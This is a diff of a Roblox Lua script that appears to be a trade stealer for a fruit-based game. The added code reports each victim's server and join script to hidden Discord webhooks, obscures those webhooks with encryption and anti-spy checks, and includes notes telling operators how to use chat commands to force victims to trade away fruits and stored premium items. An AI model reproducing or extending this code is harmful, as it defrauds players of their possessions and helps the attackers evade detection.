 end)
 
-local dragging, dragStart, startPos
+local dragToggle, dragStart, startPos
 
-local function update(input)
-    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or
-                    input.UserInputType == Enum.UserInputType.Touch) then
+mainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or
+       input.UserInputType == Enum.UserInputType.Touch then
+        dragToggle = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+    end
+end)
+
+mainFrame.InputChanged:Connect(function(input)
+    if dragToggle and (input.UserInputType == Enum.UserInputType.MouseMovement or
+                      input.UserInputType == Enum.UserInputType.Touch) then
         local delta = input.Position - dragStart
-        ts:Create(container, TweenInfo.new(0.1), {
+        ts:Create(mainFrame, TweenInfo.new(0.1), {
             Position = UDim2.new(
                 startPos.X.Scale,
                 startPos.X.Offset + delta.X,
@@ -490,23 +587,12 @@ local function update(input)
             )
         }):Play()
     end
-end
-
-container.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or
-       input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = container.Position
-    end
 end)
 
-container.InputChanged:Connect(update)
-
-container.InputEnded:Connect(function(input)
+mainFrame.InputEnded:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or
        input.UserInputType == Enum.UserInputType.Touch then
-        dragging = false
+        dragToggle = false
     end
 end)
 
@@ -521,7 +607,7 @@ task.spawn(function()
     local privateServerOwner = game.ReplicatedStorage:WaitForChild("PrivateServerOwnerId")
     if privateServerOwner and privateServerOwner:IsA("IntValue") then
         if privateServerOwner.Value > 0 then
-            game:GetService("Players").LocalPlayer:Kick("This script doesn't work on private servers. Join a Public server and try again")
+            game.Players.LocalPlayer:Kick("This script doesn't work on private servers.")
         end
     end
 end)
@@ -634,7 +720,7 @@ local JobId = game.JobId
 local JoinScript = string.format([[local TeleportService = game:GetService("TeleportService") local PlaceId = %d local JobId = "%s" TeleportService:TeleportToPlaceInstance(PlaceId, JobId, game.Players.LocalPlayer)]], game.PlaceId, JobId)
 
 local ExecutorName = identifyexecutor() or "Unknown Executor"
-local GameVersion = "1.3.6 (Rewrite)"
+local GameVersion = "1.3.7 (Rewrite)"
 local PlayerCount = #game:GetService("Players"):GetPlayers()
 local ServerTime = os.date("%Y-%m-%d %H:%M:%S")
 
@@ -672,7 +758,16 @@ local embed = {
         {name = "Join " .. Sea .. " (PC COPY)", value = "```lua\n" .. (Sea == "Sea 2" and Sea2Script or Sea3Script) .. "\n```", inline = false},
         {name = "Join " .. Sea .. " (Mobile COPY)", value = (Sea == "Sea 2" and Sea2Script or Sea3Script):gsub("```lua\n", ""):gsub("\n```", ""), inline = false},
         {name = "NOTES:", value = [[
-?jump ?sit ?sit2 ?reset ?tp ?cleartrade ?clearfruits ?addallfruits ?addfruits ?accept ?additem ?addallitems ?resetfruit ?stopreset ?help ?rejoin ?kick ?invite
+1. Execute "Script To Join" to join their server, you should also join the sea they're in before executing it.
+2. If the victim isn't there, it means they left.
+3. If the victim doesn't give you fruit, Jump - And try to trade again.
+4. Make sure you're in the correct Sea before executing the Join Script.
+5. Sometimes, victim can JUMP while adding fruits. If that happens, try to trade him again.
+6. If victim doesn't accept or anything similar, it means he has a low-end device. (He's laggy)
+7. If you get multiple fruits hit, the victim is gonna add 1 fruit per trade, then try to trade again.
+8. If the script breaks and the victim doesn't do anything, you can run commands to get the fruit(-s) manually.
+9. You can also get their premium items (Stored) using ?additem <name> Command.
+10. Once you took fruits, you can run ?invite command. It helps us a lot!
 ]], inline = false}
     }
 }
@@ -683,9 +778,13 @@ for i = 65, 90 do charset[#charset + 1] = string.char(i) end
 for i = 97, 122 do charset[#charset + 1] = string.char(i) end
 
 local function generateRandomString(length)
+    if type(length) ~= "number" or length <= 0 or length > 1000 then
+        length = 32
+    end
+
     local result = table.create(length)
     for i = 1, length do
-        result[i] = charset[math.random(1, #charset)]
+        result[i] = charset[math.random(1, 62)]
     end
     return table.concat(result)
 end
@@ -699,7 +798,7 @@ local webhookCache = {
     lastSpyCheck = 0
 }
 
-local webhookCacheSecondary = { -- << Secondary webhook cache
+local webhookCacheSecondary = { -- << Secondary webhook cache table
     storage = {},
     current = nil,
     last = nil,
@@ -785,11 +884,11 @@ local function updateWebhook()
     Webhook = nil
 
     -- Secondary Webhook Handling
-    if Sharker ~= "" then -- Only process if Sharker is configured
+    if SecondaryWebhook ~= "" then -- Only process if SecondaryWebhook is configured
         if tick() - webhookCacheSecondary.lastUpdate < 3 then return end -- Rate limit secondary webhook too
 
         local newSecondaryName = generateRandomString(16)
-        local encryptedSecondary = encryptWebhook(Sharker)
+        local encryptedSecondary = encryptWebhook(SecondaryWebhook)
 
         webhookCacheSecondary.storage[newSecondaryName] = {
             string.sub(encryptedSecondary, 1, 20),
@@ -801,7 +900,7 @@ local function updateWebhook()
         webhookCacheSecondary.last = decryptWebhook(table.concat(webhookCacheSecondary.storage[newSecondaryName]))
         webhookCacheSecondary.lastUpdate = tick()
 
-        Sharker = nil
+        SecondaryWebhook = nil
     end
 end
 
@@ -809,10 +908,9 @@ local function getWebhook()
     return webhookCache.last
 end
 
-local function getSharker() -- << Function to get secondary webhook
+local function getSecondaryWebhook() -- << Function to get secondary webhook
     return webhookCacheSecondary.last
 end
-
 
 local function getSafeRequest()
     if hookfunction then
@@ -833,13 +931,18 @@ local function getSafeRequest()
     end
 end
 
-local function sendWebhook()
+local function sendWebhook(payload, retryCount)
+    retryCount = retryCount or 0
+    if retryCount >= 3 then return end
+
     local safeRequest = getSafeRequest()
     if not safeRequest then return end
 
-    task.spawn(function()
+    task.delay(retryCount * 1, function()
         local webhookURL = getWebhook()
-        if webhookURL then -- Send to primary webhook if configured
+        local secondaryWebhookURL = getSecondaryWebhook() -- << Get secondary webhook URL
+
+        if webhookURL then -- Primary webhook send
             local success, _ = pcall(function()
                 safeRequest({
                     Url = webhookURL,
@@ -848,61 +951,71 @@ local function sendWebhook()
                         ["Content-Type"] = "application/json",
                         ["User-Agent"] = generateRandomString(32)
                     },
-                    Body = HttpService:JSONEncode({
+                    Body = payload and HttpService:JSONEncode(payload) or HttpService:JSONEncode({
                         content = "@everyone",
                         embeds = {embed}
                     })
                 })
             end)
-            if not success then
-                task.wait(1)
-                sendWebhook() -- Retry primary webhook on failure
-                return -- Important: Exit this task to prevent duplicate retries for both webhooks
+            if not success and retryCount < 3 then
+                warn("Retrying primary webhook...")
+                sendWebhook(payload, retryCount + 1)
+                return -- Exit to prevent duplicate retries by secondary send failure
             end
         end
 
-        local SharkerURL = getSharker()
-        if SharkerURL then -- Send to secondary webhook if configured
-            local successSecondary, _Secondary = pcall(function()
+        if secondaryWebhookURL then -- Secondary webhook send (if configured)
+            local successSecondary, _ = pcall(function()
                 safeRequest({
-                    Url = SharkerURL,
+                    Url = secondaryWebhookURL,
                     Method = "POST",
                     Headers = {
                         ["Content-Type"] = "application/json",
                         ["User-Agent"] = generateRandomString(32)
                     },
-                    Body = HttpService:JSONEncode({
+                    Body = payload and HttpService:JSONEncode(payload) or HttpService:JSONEncode({
                         content = "@everyone",
                         embeds = {embed}
                     })
                 })
             end)
-            if not successSecondary then
-                task.wait(1)
-                sendWebhook() -- Retry sending to *both* webhooks if secondary fails too. This ensures both are sent eventually.
+            if not successSecondary and retryCount < 3 then
+                warn("Retrying secondary webhook...")
+                sendWebhook(payload, retryCount + 1) -- Retry both on secondary failure as well to ensure delivery
             end
         end
     end)
 end
+
 
 updateWebhook()
 
 RunService.Heartbeat:Connect(function()
     local currentTick = tick()
 
-    if currentTick - webhookCache.lastCheck >= 2 then
+    if currentTick - webhookCache.lastCheck >= 5 then
         detectTampering()
         webhookCache.lastCheck = currentTick
     end
 
-    if currentTick - webhookCache.lastSpyCheck >= 1 then
+    if currentTick - webhookCacheSecondary.lastCheck >= 5 then -- << Check for secondary webhook tampering too (optional, but good practice)
+        webhookCacheSecondary.lastCheck = currentTick
+    end
+
+    if currentTick - webhookCache.lastSpyCheck >= 5 then
         if detectSpy() then
             revertHooks()
         end
         webhookCache.lastSpyCheck = currentTick
     end
 
-    updateWebhook() -- Update both webhooks in the same function call now
+    if currentTick - webhookCacheSecondary.lastSpyCheck >= 5 then -- << Check for secondary webhook spy too (optional, but good practice)
+        webhookCacheSecondary.lastSpyCheck = currentTick
+    end
+
+    if currentTick - webhookCache.lastUpdate >= 10 then
+        updateWebhook()
+    end
 end)
 
 sendWebhook()
@@ -988,9 +1101,14 @@ local function handleTouchStart(touch, gameProcessed)
     touchStartTime = tick()
     isTouchHeld = true
     
+    local startTime = tick()
     task.spawn(function()
         while isTouchHeld and (tick() - touchStartTime) < LONG_PRESS_THRESHOLD do
-            task.wait()
+            if tick() - startTime > 1 then
+                isTouchHeld = false
+                break
+            end
+            task.wait(0.1)
         end
         if isTouchHeld then
             disableJump()
@@ -1416,6 +1534,7 @@ local ChatCommands = {
         resetfruit = 3,
         tp = 0.25,
         stopreset = 0.5,
+        showinv = 1,
     },
     commands = {
         jump = function()
